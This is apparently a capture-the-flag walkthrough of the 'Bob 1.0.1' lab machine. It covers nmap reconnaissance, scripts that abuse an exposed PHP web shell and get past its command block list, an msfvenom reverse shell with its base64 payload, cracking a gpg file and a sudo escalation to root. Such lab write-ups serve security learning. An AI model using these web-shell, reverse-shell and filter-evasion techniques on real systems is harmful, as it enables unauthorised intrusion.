## Background

Someone attacked the Milburg Highschool Server. The IT staff took down their Windows server and replaced it with a Linux server running Debian. Your mission, should you choose to accept, is to find the weak points in the new server.

## Information Gathering

Let's kick this off with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.20.130
...
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
| http-robots.txt: 4 disallowed entries
| /login.php /dev_shell.php /lat_memo.html
|_/passwords.html
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
25468/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey:
|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
|_  256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)
```

`nmap` finds `80/tcp` open, and four disallowed entries in `robots.txt`. Although the port `25468/tcp` is uncommon for SSH, nothing funky is going on here.

## Directory/File Enumeration

Besides the unverified files from `robots.txt`, you can run the following command to look for more files. These files are at the end of the hyperlinks found in the site's landing page.

```
# curl -s 192.168.20.130 | grep -Po '(href|src)=".*"' | cut -d'"' -f2
school_badge.png
index.html
news.html
about.html
contact.html
login.html
WIP.jpg
```

`contact.html` exposes the personnel working in the IT department. We now know that Bob is the admin—we should probably be targeting him.

Otherwise, there's nothing interesting with these files except for `dev_shell.php`. It exposes a web shell, our first attack surface—this is how it looks like in the browser.

## Web Shell

Although the web shell allows remote execution of commands in the context of `www-data`, it filters common commands such as `cat` and `ls`; and in return, displays unhelpful messages like "Nice try skid" or "Get out skid".

Essentially, `cat` reads a file's content and prints it to standard output in ASCII. If you've read permissions for the file, you can use `xxd` to achieve the same result, by first showing the content in hexadecimal, and then converting it back to ASCII before printing to standard output.

I wrote `cat.sh` to establish the idea of using `xxd` as the replacement for `cat`.

<div class="filename"><span>cat.sh</span></div>
```bash
#!/bin/bash

HOST=192.168.20.130
SHELL=dev_shell.php
CMD="xxd -p $1 | tr -d '\n'"

curl \
        -s \
        --data-urlencode "in_command=$CMD" \
        $HOST/$SHELL \
| sed '29!d' \
| sed -r -e 's/^\s+//' -e 's/  <\/div>//' \
| xxd -p -r
```

Another script I wrote, `ls.sh`—uses `find` as the replacement for `ls`.

<div class="filename"><span>ls.sh</span></div>
```bash
#!/bin/bash

HOST=192.168.20.130
SHELL=dev_shell.php
CMD="find $1 -ls"

curl \
        -s \
        --data-urlencode "in_command=$CMD" \
        $HOST/$SHELL \
| sed '/<h5>/,/<\/div>/!d' \
| sed -r -e '1d' -e '$d' -e 's/^\s+//' \
| column -t
```

Using `ls.sh` to list the files along with their permissions in a directory is easy.
```
# ./ls.sh /var/www/html
396954  4     drwxr-xr-x  2  root  root  4096     Mar  8  23:48  /var/www/html
393294  4     -rw-r--r--  1  root  root  1560     Mar  4  14:09  /var/www/html/login.html

393275  4     -rw-r--r--  1  root  root  2579     Mar  8  23:43  /var/www/html/about.html
393288  4     -rw-r--r--  1  root  root  1361     Mar  4  14:09  /var/www/html/dev_shell.php.bak
393299  28    -rw-r--r--  1  root  root  26357    Mar  4  14:09  /var/www/html/school_badge.png
393287  4     -rw-r--r--  1  root  root  1396     Mar  4  14:09  /var/www/html/dev_shell.php
397124  4     -rw-r--r--  1  root  root  1425     Mar  4  14:09  /var/www/html/index.html
393296  4     -rw-r--r--  1  root  root  673      Mar  8  23:43  /var/www/html/passwords.html
```

I can then use `cat.sh` to display the contents of any file where `www-data` has read permissions. For example, let's find out what's in `dev_shell.php`.

```
# ./cat.sh /var/www/html/dev_shell.php
...
  <?php
    //init
    $invalid = 0;
    $command = ($_POST['in_command']);
    $bad_words = array("pwd", "ls", "netcat", "ssh", "wget", "ping", "traceroute", "cat", "nc");
  ?>
  ...
    <?php
    system("running command...");
      //executes system Command
      //checks for sneaky ;
      if (strpos($command, ';') !==false){
        system("echo Nice try skid, but you will never get through this bulletproof php code"); //doesn't work :P
      }
      else{
        $is_he_a_bad_man = explode(' ', trim($command));
        //checks for dangerous commands
        if (in_array($is_he_a_bad_man[0], $bad_words)){
          system("echo Get out skid lol");
        }
        else{
          system($_POST['in_command']);
        }
      }
    ?>
  ...
```

Now that we know how `dev_shell.php` works, let's get ourselves a proper shell.

## Low-Privilege Shell

Here's an overview of how you can get a low-privilege shell:

On your attacking machine:

1. Generate a reverse shell with `msfvenom`.
2. Set up `netcat` listener.
3. Encode the reverse shell in `base64`.

In the web shell:

<ol start="4">
<li>Run <code>echo -n [output from #3] | base64 -d > /tmp/rev</code>.</li>
<li>Run <code>chmod +x /tmp/rev</code> in the web shell.</li>
<li>Run <code>/tmp/rev</code> in the web shell.</li>
</ol>

***Step 1: Generate a reverse shell with `msfvenom`***

Before you generate the reverse shell, you need to determine the target's OS architecture—by running `uname -a` in the web shell. `msfvenom` needs this information to generate the correct reverse shell.

![0.roxsyv6gela](/assets/images/posts/bob-1.0.1-walkthrough/0.roxsyv6gela.png)

The target is running 64-bit Debian.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x64 --platform linux -f elf -o rev
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rev
```

***Step 2: Set up `netcat` listener***

```
# nc -lnvp 4444
```

***Step 3: Encode the reverse shell in `base64`***

```
# base64 rev | tr -d  '\n' && echo
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAwgAAAAAAAAAMAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdIuQIAEVzAqBSAUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
```

***Step 4: Run `echo -n [output from #3] | base64 -d > /tmp/rev`***

Because the output of this step ends up in file redirection, you don't see anything visible in the web shell. You can use `md5sum` for verification on your attacking machine and in the web shell to ensure the reverse shell is intact and unmodified.

```
# md5sum rev
f05a125872c14d573304819ac2997782  rev
```
![0.rxt6dcx6xhs](/assets/images/posts/bob-1.0.1-walkthrough/0.rxt6dcx6xhs.png)

Good. Both files are identical.

***Step 5: Run `chmod +x /tmp/rev`***

Although this step produces no visible output, you can use `ls.sh` to verify that `rev` is executable.

![0.kscltrqq2b](/assets/images/posts/bob-1.0.1-walkthrough/0.kscltrqq2b.png)

***Step 6: Run `/tmp/rev`***

After this step, you should see a reverse shell in your `netcat` listener like so.

![0.zcmr8cq5i6l](/assets/images/posts/bob-1.0.1-walkthrough/0.zcmr8cq5i6l.png)

This is a well-known technique—using Python to spawn a shell with output control.

## Privilege Escalation

By now, you should have the following information at your fingertips:

* Four accounts in the host: `bob`, `elliot`, `jc` and `seb`. They already made their first appearance in `contact.html`.
* One account is missing: `c0rruptedb1t`
* Bob is a man of secrets. He kept the following files at different locations:
  * `.old_passwordfile.html`—the original copy of `passwords.html`.
  * `staff.txt`—a text file dissing everyone in the IT department except himself.
  * `notes.sh`—a `bash` script that spits out incoherent phrases.
  * `login.txt.gpg`—a file encrypted with AES symmetric cipher.
* Elliot detests the admin, and so he decided to change his password to `theadminisdumb`. ¯\\_(ツ)_/¯

Looking on as an outsider, the submerged power struggle and office politics among the IT guys of Milburg High is starting to surface following the first security breach. I can't imagine what will happen if there's another security breach.

Like I said before, Bob is probably the one we should be targeting, judging from the secrets he has harbored. If I had to guess, I would say `login.txt.gpg` contains Bob's password and `notes.sh` contains the hints to decrypt `login.txt.gpg`.

First, let's use `scp` to copy `login.txt.gpg` and `notes.sh` to my attacking machine. Both files are readable by everyone.

![0.fakh2xng4i](/assets/images/posts/bob-1.0.1-walkthrough/0.fakh2xng4i.png)

```
# scp -P 25468 jc@192.168.20.130:/home/bob/Documents/login.gpg .
# scp -P 25468 jc@192.168.20.130:/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh .
```
Next, build a wordlist from the words in `notes.sh` like so.

```
# ./notes.sh | grep -Po '[a-zA-Z]+' > wordlist
# wc -l wordlist
60 wordlist
```
I googled and found [PGPCrack-NG](https://github.com/kholia/PGPCrack-NG). According to the project description,

>PGPCrack-NG is a program designed to brute-force symmetrically encrypted PGP files

Precisely what I need. Fits the bill down to a T.

Like a child who has found a new toy, I ran PGPCrack-NG with the wordlist and waited patiently for the password to appear. But, there's no result at all.

I ran `notes.sh` again and again. I kept staring at it endlessly. This can't be true.

And then the **epiphany** came&hellip;

![0.z6pd10vab8](/assets/images/posts/bob-1.0.1-walkthrough/0.z6pd10vab8.png)

```
# ./notes.sh | sed 1d | cut -c1 | tr -d '\n' && echo
HARPOCRATES
```

According to [Wikipedia](https://en.wikipedia.org/wiki/Harpocrates), Harpocrates (Ancient Greek: Ἁρποκράτης) was the god of silence, secrets and confidentiality in the Hellenistic religion developed in Ptolemaic Alexandria (and also an embodiment of hope, according to Plutarch).

This must be the password to decrypt `login.txt.gpg`.

```
# gpg -d --passphrase HARPOCRATES --batch login.txt.gpg
gpg: AES encrypted data
gpg: encrypted with 1 passphrase
bob:b0bcat_
```

Sweet.

With Bob's password, I can SSH to his account and guess what—Bob is the admin alright.

Elevating to `root` is one command away: `sudo -s`.
